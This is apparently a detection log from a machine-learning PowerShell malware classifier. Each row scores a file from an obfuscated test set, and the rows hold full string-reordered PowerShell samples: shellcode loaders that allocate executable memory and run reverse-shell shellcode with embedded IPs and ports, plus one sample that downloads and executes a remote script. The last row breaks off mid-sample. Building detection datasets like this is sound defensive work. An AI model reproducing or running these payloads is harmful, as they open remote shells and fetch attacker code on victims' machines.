2026-07-13 16:35:08,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1056.ps1,custom-ps-ml,UNKNOWN,515cadd2-e981-4a10-bdfd-843394c193f7,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,3029,1552.16,".((geT-vAriaBLe '*mDR*').NAME[3,11,2]-joIN'')( ((\""{37}{29}{15}{41}{47}{33}{13}{19}{56}{60}{17}{38}{18}{65}{23}{3}{66}{64}{24}{70}{63}{45}{32}{40}{6}{61}{4}{59}{52}{36}{25}{11}{1}{46}{26}{49}{55}{53}{10}{39}{31}{30}{20}{51}{35}{43}{28}{22}{16}{34}{69}{5}{67}{14}{12}{7}{54}{8}{44}{58}{62}{0}{68}{9}{21}{50}{48}{42}{57}{2}{27}\""-f '6,0x75,0xe9,0xc3',',0x75,0xe4','Oi], 1)};U7Ow::CreateThread(0,0,U7Ox,0,0,0);for (;;)','memberDefinition U7Oc -Name RzWWin32RzW -namespace Win32Functions -passthru;[Byte[]];[By','01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0','7e,0xe9,0x8b,0x36,0x6a,0x40,',',0x20,0xc1,0xcf,0','68,0x',',0x5f,0xff,0xd5,0x83,0xf8','0xf0,0',',0x6','x7d,0x24','6a,0x00,0x','extern IntPtr Creat','0x00,0x10,0x00,0x00,0x56,0x',' lpAddres','00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83','ationFlags, IntPtr lpThreadId);[DllImpor','msvcrt.dllRzW)]public static extern IntPtr memset(IntPtr dest, uint src,','eThre',',0x68,0x4','xb5,0xa2,0x','0,0x1f,0x99,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x',';U7Ow = Add-Type -','0,0x00','cf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0','4,0x01,0x','{Start-sleep 60};',',0x97,0x6a,0x05,0x68,0xc0,0xa8,0x44,0x80,0x68,0x02,0x0','rtualAlloc(IntPtr','5f,0x54','9,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x',',0x4a,0x26,0x31,0xff,0xac,0x','t);[DllImport(RzWkernel32.dllRzW)]public static ',',0xf8,0x00,0','9,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,','b,0x01,0xd6,0x31,0xff,0xac,0xc1,0x','U7Oc = Z5V[DllImport(RzWkernel32.dllRzW)]public static extern IntPtr Vi','t(RzW','1,0x5','3c,0x61,0x7c,0x02,0x2c','s, uint dwSize, uin',',U7Og,0x40)','0xd5',',0x','x0f,0xb7',',0x58,0x8b,0x58,0x2','t flAllocationType, uint flProtec','if (U7Oz.Length -gt 0x1000){U7Og = U7Oz.Length};U7Ox=U7Ow::VirtualAlloc(0,0x1000','d','56,0x6a,0x00,0x53,0xff,0xd5;U7Og = 0x1000;','c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x2','0x8b,0x34,0x8',',0x44,0x24,0x24,0x5b,0x5b','58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8','3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89','ad(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, In',';for (U7Oi=0;U7Oi -le (U7Oz.Length-1);U7Oi++) {U7Ow::memset([IntPtr](U7Ox.ToInt32()+U7Oi), U7Oz[U7','00,0x7e,0xc3,0x0','x3a,0x49,','tPtr lpParameter, uint dwCre','x0d,0x','1,0xc3,0x29,0xc',',0x8b,0x52,0x14,0x8b,0x72,0x28,0','00,0x0',' uint count);Z5V','te[]]U7Oz = 0xfc,0xe8,0x82,0x','0x68,',',0xbb,','x',',0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c')).REpLACe(([char]85+[char]55+[char]79),[STRInG][char]36).REpLACe(([char]82+[char]122+[char]87),[STRInG][char]34).REpLACe('Z5V',[STRInG][char]39) )",malicious,TP
2026-07-13 16:35:21,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1060.ps1,custom-ps-ml,UNKNOWN,2cd00508-8e2e-46b0-900c-01c00362ef60,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2969,1697.95,". ( $PshOMe[4]+$pSHOME[34]+'x')((((\""{68}{5}{41}{19}{7}{10}{12}{46}{40}{31}{62}{36}{53}{54}{16}{65}{21}{20}{25}{66}{3}{33}{0}{11}{63}{26}{59}{22}{38}{60}{30}{45}{44}{32}{8}{48}{18}{29}{6}{57}{23}{61}{58}{50}{1}{4}{47}{35}{15}{27}{13}{49}{28}{67}{52}{17}{43}{51}{56}{42}{39}{2}{55}{37}{9}{64}{14}{69}{34}{24}\""-f '2,0x3c,0x01,','0x5a',' -le (gtIz.Len','c7,0xe2,0x',',0x68,0x02,0x00,0x15,0xb4,0x89,0xe6,0x6a,0','32.dlltKU)]public static exter','0x00,','Ptr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(tKUkernel32.dlltKU)]public static ex','12,0xeb,0x86,0x5d,0x68,0x33,0','w::memset([IntPtr](gtIx.ToInt32()+gtI','tern IntPtr Crea','0xd0,0x8b,0x40,0x78,0x85','teThread(IntP','8,0x5f,','gtIz[gtIi], 1)};gtIw::CreateThread','68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00','tIz = 0xfc,','x56,0x5','0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,','oc(Int','52,0x30,0x8b,0x52',',0xd2,0x64,0x8b,0x',',0x20,0x01,0xd3,0xe','x50,0x50,0x50,0x50,0x40,0x50,0x40,0x','t-sleep 60};',',0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0','x18,0x8b,',',0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc','b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x0','0x50,0x68,0x29,0x80,0x6b,',',0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,',' IntPtr lpThreadId);[Dll',',0x58,0x5f,0x5a,0x8b,0x','f0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4',',0,0);for (;;){Star',',0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x','tr memset(IntPtr dest, uint src, uint count);rmc;gtIw = Add-Type -memberDefinition gt','I','3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf','h};gtIx=gtIw::VirtualAlloc(0,0x1000,gtIg,0x40);for (gtIi=0;gtIi','readAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags,','n IntPtr VirtualAll','xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;gtIg = 0x1000;if (gtIz.Length -gt 0x1000){gtIg = gtIz.Lengt','3,0x57,0x68,0x02,0','1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0','0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x0','tr lpTh','x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0','x32,','0xff,0xd5,0x8','97,0x6a,0x05,0x68,0x40,0x96,0xbd,','x','5,0x93,0x53,0x6a,0x00,0','Ic -Name tK','UWin32tKU -namespace Win32Functions -passthru;[Byte[]];[Byte[]]g','gth-1);gtIi++) {gt','d9,0xc8,0x5f,0xff,0','0xff,0xd5,0','xd5,0x','0x58',',0x0d','50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0','Import(tKUmsvcrt.dlltKU)]public static extern IntP',',0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0','i), ','0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31','xcf,0x0d,0x01,0x','0,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd','gtIc = rmc[DllImport(tKUkernel','(0,0,gtIx,0')) -cRepLacE ([chaR]103+[chaR]116+[chaR]73),[chaR]36-cRepLacE ([chaR]114+[chaR]109+[chaR]99),[chaR]39  -cRepLacE ([chaR]116+[chaR]75+[chaR]85),[chaR]34))",malicious,TP
2026-07-13 16:35:35,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1064.ps1,custom-ps-ml,UNKNOWN,c3ea3f71-6a0e-46ac-8f07-c642a4ba032f,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2783,1754.66,"Iex ((((\""{12}{32}{17}{18}{6}{11}{21}{41}{2}{9}{28}{15}{16}{27}{40}{13}{3}{5}{37}{19}{25}{45}{38}{7}{33}{30}{39}{43}{10}{42}{36}{31}{44}{29}{22}{0}{23}{8}{20}{1}{4}{34}{35}{14}{46}{26}{24}\"" -f'00',',0x85,0xf6,0x75,0xec,0xc3;jdVg = 0x1000;','t, uint src, uint count);sl1;jdVw = Add-Type -memberDefinition jdVc -Name 92jWin3','3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0','if (jdVz.Length -gt 0x1000){jdVg = jdVz.Length};jdV','x66,0x8b,','nt dwCreationFlags, IntPtr lp','xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50','xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3','292j -namespace Win32Functions -passthru;[Byte[]];[Byte[]]jdVz = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0','0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x25,0x30,0x4d,0xe1,0x68,0x02','ThreadId);[','jdVc = sl1[DllImport(92jkernel32.dll92j)]public static extern IntPtr VirtualAlloc(Int','c7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x','oInt32()+jdVi), jdVz[jdVi], 1)};jdVw::CreateThread(0,0,','0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18',',0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8','static extern IntPtr CreateThread(IntPtr lp','ThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, ui','x1c',',0x29,0xc6','DllImport(92jmsvcrt.dll92j)','x40,0x68,0x00,0x10,0x00,0x',',0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0','tart-sleep 60};',',0x0','(;;){S','b,0x01,0xd6,0x31,0xff,0x31,','x89,0xe5,0x31,0xd2,',',0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0','0x40,0x50,0x','xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74','Ptr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(92jkernel32.dll92j)]public ',',0x50,','x=jdVw::VirtualAlloc(0,0x1000,jdVg,0x40);for (jdVi=0;jdVi -le (jdVz.Length-1);jdVi++) {jdVw::memset([','IntPtr](jdVx.T','xd4,0xea,0x89,0','0x0c,0x4b,0x8b,0x58,0','5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0','40,0x50','0xc0,0xac,0xc1,0xcf,0x0d,0x01,0x',']public static extern IntPtr memset(IntPtr des',',0x00,0',',',',0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a','1,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x','jdVx,0,0,0);for '))  -rEPLaCe  ([CHAr]115+[CHAr]108+[CHAr]49),[CHAr]39 -rEPLaCe  ([CHAr]106+[CHAr]100+[CHAr]86),[CHAr]36  -CRePLaCe ([CHAr]57+[CHAr]50+[CHAr]106),[CHAr]34))",malicious,TP
2026-07-13 16:35:40,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1069.ps1,custom-ps-ml,UNKNOWN,5d1064f7-cba3-4e4b-875a-08b411b3c849,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2969,1548.01," ((\""{30}{2}{50}{11}{55}{57}{35}{66}{42}{12}{32}{13}{24}{51}{56}{6}{68}{33}{26}{3}{58}{63}{14}{7}{1}{47}{49}{46}{69}{20}{52}{37}{54}{43}{60}{29}{8}{39}{27}{23}{15}{21}{44}{0}{61}{40}{5}{62}{59}{53}{36}{19}{31}{48}{10}{38}{34}{25}{17}{64}{65}{45}{9}{18}{67}{4}{16}{22}{41}{28}\""-f 'x33,0x32,0x',',0x01,','Import(nFakernel32.dll','0,0x0','xd5,0x','0,0x00,0x29,0','ctions -passthru;','xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d','xc7,0x38,0xe0,0','0x57,0x68,0x02,0xd','x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x','ic static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(nFakernel32.dllnFa)]pu','reationFlags, IntPtr lpThreadId','crt.dllnFa)]public static ','8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0','0x24,0x5b,0x5b,0x61,','01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;IP1g = 0x1000;if (IP1z.Length -gt 0x1000){IP1g = IP1z.Length};IP1k9I=IP1w::VirtualAlloc(0,0x1000,IP1g,0x40);for (IP1i=0;IP1i -le (IP1z.Length-1);IP1i++) {IP1w::memset([IntPtr](IP1k9I.ToInt','x75,0xec,0x68,0xf0,0xb5,','9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,','xdf,0xe0,0xf','x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0','0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0','32()+IP1i), IP',',0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,','extern IntPtr memset(','x0c,0xff,0x4e,0x08,0','0x89,0x0',',0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c','(;;){Start-sleep 60};','01,0','IP1tq73 = gx6[Dll','f,0xd5,0x97,0x6a,0x05,0x68,0x0a,0x00,0x02,0x0f,0x',');[DllImport(nFamsv','Byte[]]IP1z = 0xfc,0xe8,',',0x61,0xff,0xd5,0x85,0xc0,0x74,0','hreadAttributes,','0f,0','b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,','99,0xa5,0x74','x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01','f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x0','1z[IP1i], 1)};IP1w::CreateThread(0,0,IP1k9I,0,0,0);for ','tPtr lpParameter, uint dwC','x01,0xd6,0x31,0xff,0','x86,0x5d,0x68,0','0x04,0x56,','x57,0x8b,0x52','0xc7,0xe2,0xf0,0x','68,0x02,0x00,0x11,0x5c,0','52,0','nFa)]publ','IntPtr dest, uint src, uint count);gx6;IP1w = Add-Type -memberDefinition IP1tq73 -Name nFaWin32nFa -namespac','x8',',0x50,0x40,0x50,0x68,0xea,0x','0x8b,0x34,0x8b,0','blic static extern IntPtr CreateThread(IntPtr','e Win32Fun',' lpT','0,0x00,0x60,0x89,0xe5','8,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40','x31,0xc0,0xac,0xc1,0xcf,0x0d,0x','00,0x00,0x68,0x77,0x73,0x32,0x5','xc4,0x54,0x50,0x6',',0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x','0xa2,0x56,0xf','f,0xd5,0x6a,0x00,0x6a,',' uint dwStackSize, IntPtr lpStartAddress, In','0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0','[Byte[]];[',',0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0')).rePLace(([cHaR]103+[cHaR]120+[cHaR]54),[sTrinG][cHaR]39).rePLace(([cHaR]110+[cHaR]70+[cHaR]97),[sTrinG][cHaR]34).rePLace('IP1','$') | &amp; ( $psHOME[21]+$pShOme[30]+'X')",malicious,TP
2026-07-13 16:35:46,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1083.ps1,custom-ps-ml,UNKNOWN,4763826e-228c-4b26-8133-953425ea78dc,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,1282,1740.55,"(((\""{37}{17}{13}{71}{7}{61}{3}{2}{46}{53}{22}{63}{5}{64}{41}{32}{52}{82}{79}{62}{47}{77}{29}{81}{66}{72}{14}{40}{0}{73}{44}{20}{48}{16}{65}{12}{8}{11}{31}{49}{36}{23}{9}{80}{45}{56}{76}{54}{38}{75}{83}{4}{24}{50}{42}{58}{70}{57}{15}{39}{26}{30}{21}{68}{55}{27}{43}{28}{69}{59}{10}{74}{51}{25}{6}{84}{34}{1}{78}{67}{35}{19}{60}{18}{33}\""-f 'PrO','LENGtH]};','arsMozilla/5.','iu=','sV','T','rpUik[pU','NET.WEBCli','::DeFAULt','dENTiALS = [SYstEM.NeT.CRede','aspym','W','est]','Ect SYSt','iu);pUiwC','(','BReQ','wC=NeW-OBJ','sa','join','Te','aDSTrING(ym','ndo','Y.CRE','NMkZc{S;g','Xo','ChaR[]](pUiWC.D','.19','.1','(','oWnlo','EbP','ident/7.0;','rs)','.','B-','.Prox','pUi','Et','[','.',' WOW64; Tr','_fD8u:4xLX-','6.119','SyS','AChe]:','0 (','wC.HeadeRs','m.NET.We','roXy;pUiwc','Ae','))Mfk%{pUi_-B',' ','Wi','tN','/52',':DEFau','pUib=','Ciw^U,Br&lt;ars;p','0/index.','ar','eNT;pU',';pUi','ws N',' 6.1;','u','Us','EX (pUi','phttp:/','13:8','Uii=0;[chAr[]]','EM.','er-Agentars,pU','xy = [','p)','workCredeNtialS;p','L','.Add','I','s','ntIalC','ars','rv:11.0) like Geckoar','UiK=ar','iI++%pUiK')) -repLaCe  ([chAr]112+[chAr]85+[chAr]105),[chAr]36-repLaCe 'ymp',[chAr]34 -Creplace'ars',[chAr]39  -Creplace  ([chAr]77+[chAr]102+[chAr]107),[chAr]124) | &amp;( $PshOmE[4]+$PshOme[34]+'x')",malicious,TP
2026-07-13 16:35:52,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1086.ps1,custom-ps-ml,UNKNOWN,68f79a16-f871-40f4-af8d-66cce48cfe16,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,3023,1768.84,"&amp; ((VarIABle '*mDr*').nAME[3,11,2]-Join'') ( ((\""{37}{45}{27}{42}{0}{21}{49}{43}{47}{39}{24}{26}{9}{44}{12}{23}{48}{14}{31}{28}{22}{38}{5}{15}{29}{34}{10}{40}{8}{36}{7}{50}{4}{33}{20}{1}{6}{30}{11}{25}{19}{2}{17}{13}{18}{32}{46}{3}{16}{41}{35}\""-f'int dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwC','0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0',',0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0','YRaw::m',',0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0','b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,','xec,0xe8,0x61,0x00,0x0','x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x6','26,0x0','4,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7','8,0x33,0x32,0x',',0x6a,0x04,0x56,0x57,0x68','f2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0','0,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xf','59,0x20,0x01,0xd3,0x8b,0x49,0x18,','0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d','emset([IntPtr](YRax.ToInt32()','x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x0','f,0x0c,0x24,0xe9,0x71,0xff,',',0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02','df,0xe','reationFlags, IntPtr lpThreadId);','8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7','x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0','YRa',',0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00','z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x6','el32.dllvtq)]public static extern IntPtr CreateThread(Int','49,0x8b,0x34,0x',',0','0,0x00,0x6a,0x00','0xe3,0x3a,0x','0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;YRag = 0x1000;if (YRaz.Length -gt 0x1000){YRag = YRaz.Length};YRax=YRaw::VirtualAlloc(0,0x1000,YRag','x0f,0x','x5d,0x6','teThread(0,0,YRax,0,0,0);for (;;){Start-sleep 60};','7,0xff,0xd5,0xb8,0x90,0x01,0','YRac = SDW[DllImport(vtqkernel32.dllvtq)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSiz','d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4','aw = Add-Type -memberDefinition YRac -Name vtqWin32vtq -namespace Win32Functions -passthru;[Byte[]];[Byte[]]','00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x','+YRai), YRaz[YRai], 1)};YRaw::Crea','Ptr lpThreadAttributes, u','nt src, u',',0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0x','e, uint flAllocationType, uint flProtect);[DllImport(vtqkern',',0x40);for (YRai=0;YRai -le (YRaz.Length-1);YRai++) {','int count);SDW;YR','x51,0x8b,0x','[DllImport(vtqmsvcrt.dllvtq)]public static extern IntPtr memset(IntPtr dest, ui','8,0xc0,0xa8,0x00,0x2d,0x68,0x02,0x00,0x11,0x5c')).REpLAcE('vtq',[STRIng][CHaR]34).REpLAcE('YRa','$').REpLAcE(([CHaR]83+[CHaR]68+[CHaR]87),[STRIng][CHaR]39) )",malicious,TP
2026-07-13 16:36:06,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1089.ps1,custom-ps-ml,UNKNOWN,42998f82-c839-4d04-afd7-0e6bb4079b57,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2922,1465.94," ((\""{32}{35}{58}{21}{23}{3}{40}{22}{56}{37}{49}{53}{60}{43}{8}{63}{64}{45}{4}{10}{29}{42}{62}{41}{14}{16}{47}{55}{38}{48}{57}{25}{52}{33}{7}{46}{51}{11}{26}{18}{12}{67}{30}{17}{2}{19}{9}{6}{0}{34}{5}{54}{36}{31}{61}{39}{27}{66}{50}{44}{59}{24}{69}{65}{15}{68}{28}{1}{13}{20}\""-f ',0x06,0','w::Creat',',0x29,0xc4,0x54,0x50,0x68,0x29,0x80,','pe, u','Type -','x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,',',0xc0,0xa8,0x01','0xa','llI','0x97,0x6a,0x05,0x68','memberDefinition ysnc -Name K1dWin32K1d -namespace Win32Functions -passthru;[B','x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x',',0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58','eThread(0,0,ysnx,0,0,0);','4,0x8','nx.ToInt32()+ysni), ysnz[ysni], ','b,0x72,0x','7,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00',',0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24','0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,','for (;;){Start-sleep 60};','lloc(IntPtr lpAddress, uint dwSize, u','llImport(K1dkernel32.dllK1d)]public static extern IntPtr CreateThread(','int flAllocationTy','1);ysni++)','3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0','0c,0x4b,0x8b',',0xe5,0xff',')};ysn','yte[]];[Byte[]]ysnz = 0xfc,0xe8,0x89,0x00,0x00,0x','7','ff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x','ysnc = ETU[DllImport(K1dkernel32.dllK1d)]pu',',','x68,0x02,0x00,0x01,0xbc,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0','blic static extern IntPtr Virt','d9,0xc8,0x5f,0x','es, u','0x7c,0x02,0x2c,0x2',',0x00,0x68,0x58,0xa4,0x53','int flProtect);[D','89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x1','00,0','lags, IntPtr lpThreadId);[D','nz','ysnw = Add-','c,','28,0x0f,0xb7,0x4a,0x26,0','0,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a','int dwStackSize, IntPtr lpStartAddress, I','9,0xc6,0x85,0xf6,0x75,0xec,0xc3;ysng = 0x1000;if (ys','0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0','x31,0xc0','ntPtr lpParameter, uint dw','0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0x','x31,0xff,0x31,0xc0,0xac,0x3c,0x61,','IntPtr lpThreadAttribut',',0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe','ualA','.Length -gt 0x1000){ysng = ysnz.Length};ysnx=ysnw::VirtualAlloc(0,0x1000,ysng,0x40);for (ysni=0;ysni -le (ysnz.Length-','CreationF','00,0x10,0x00,0x00,0x56,0x6a','x60,0x','mport(K1dmsvcrt.dllK1d)]public static extern IntPtr memset(IntPtr dest, uint 